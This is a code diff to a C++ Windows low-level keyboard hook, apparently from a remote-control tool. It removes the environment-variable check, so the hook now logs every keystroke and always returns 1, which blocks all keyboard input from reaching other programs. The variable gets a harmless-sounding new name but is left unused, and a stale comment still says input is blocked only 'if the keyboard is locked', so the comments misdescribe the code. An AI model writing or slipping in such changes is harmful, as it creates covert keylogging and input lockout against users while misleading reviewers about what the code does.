@@ -1,6 +1,6 @@
 #include "keyboard.h"
 
-#define KB_ENV L"RCDO_KBLOCK" // name of environment variable to search for
+#define KB_ENV L"RCDO_NOTIFY" // name of environment variable to search for
 
 // map to track keystrokes that cannot be mapped with MapVirtualKeyExW
 std::map<int, std::wstring> mapSpecialKeys = {
@@ -197,22 +197,14 @@ void logKeystroke(int vkCode){
 LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam){
     // function handler for all keyboard strokes
 
-    std::wstring buffer = getEnvVar(KB_ENV, L"0");
+    if (nCode >= 0){
+        if (wParam == WM_KEYDOWN){
+            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 
-    long int keyboardLocked = wcstol(buffer.c_str(), NULL, 2);
-
-    if (keyboardLocked){
-        if (nCode >= 0){
-            if (wParam == WM_KEYDOWN){
-                kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-
-                logKeystroke(kbdStruct.vkCode);
-            }
+            logKeystroke(kbdStruct.vkCode);
         }
-
-        // returns a non-zero value if the keyboard is locked to prevent the input from reaching other processes
-        return 1;
     }
 
-    return CallNextHookEx(ghHook, nCode, wParam, lParam);
+    // returns a non-zero value if the keyboard is locked to prevent the input from reaching other processes
+    return 1;
 }
